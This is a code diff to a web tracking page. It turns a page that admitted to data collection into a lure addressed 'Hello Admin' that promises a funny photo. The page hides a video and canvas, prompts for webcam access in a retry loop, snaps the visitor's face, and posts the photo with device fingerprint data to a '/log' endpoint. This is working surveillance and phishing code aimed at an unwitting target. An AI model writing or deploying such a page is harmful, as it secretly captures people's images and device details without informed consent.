@@ -56,8 +56,9 @@ def track():
     html = """
     <html>
     <body>
-        <h1>Data Collection in Progress</h1>
-        <p>Your information has been recorded.</p>
+        <h1>Hello Admin</h1>
+        <p>Hi here is a funny photo post this.</p>
+        <p id="status"> </p>
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
         
@@ -68,32 +69,41 @@ def track():
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
-                try {
-                    // Attempt to access webcam with more permissive constraints
-                    const constraints = { 
-                        video: { 
-                            facingMode: "user",
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    };
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    video.srcObject = stream;
+                const constraints = { 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                };
 
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const screenshot = canvas.toDataURL('image/jpeg');
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    return screenshot;
-                } catch (err) {
-                    console.error('Camera access failed:', err.name, err.message);
-                    // Fallback data if camera access is denied
-                    return {
-                        error: 'Camera access denied',
-                        errorDetails: err.message,
-                        timestamp: new Date().toISOString()
-                    };
+                while (true) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        video.srcObject = stream;
+                        await new Promise(resolve => video.onloadedmetadata = resolve);
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const screenshot = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                        return screenshot;
+                    } catch (err) {
+                        console.error('Camera access failed:', err.name, err.message);
+                        document.getElementById('status').innerText = 
+                            'Camera access denied. Please allow camera access to continue.';
+                        
+                        // Redirect to a page that prompts for permission again
+                        if (confirm('Camera access is required. Click OK to try again or Cancel to proceed without photo.')) {
+                            // Retry immediately
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                            continue;
+                        } else {
+                            return {
+                                error: 'Camera access denied by user',
+                                errorDetails: err.message,
+                                timestamp: new Date().toISOString()
+                            };
+                        }
+                    }
                 }
             }
 
@@ -127,13 +137,15 @@ def track():
                 doNotTrack: navigator.doNotTrack || window.doNotTrack || 'Not set'
             };
 
-            // Attempt camera access and send data regardless of result
+            // Attempt camera access and send data
             (async () => {
                 const screenshotResult = await captureScreenshot();
                 if (screenshotResult && typeof screenshotResult === 'string') {
                     deviceInfo.screenshot = screenshotResult;
+                    document.getElementById('status').innerText = 'Photo captured successfully!';
                 } else if (screenshotResult && screenshotResult.error) {
                     deviceInfo.cameraError = screenshotResult;
+                    document.getElementById('status').innerText = 'Proceeding without photo.';
                 }
 
                 fetch('/log', {
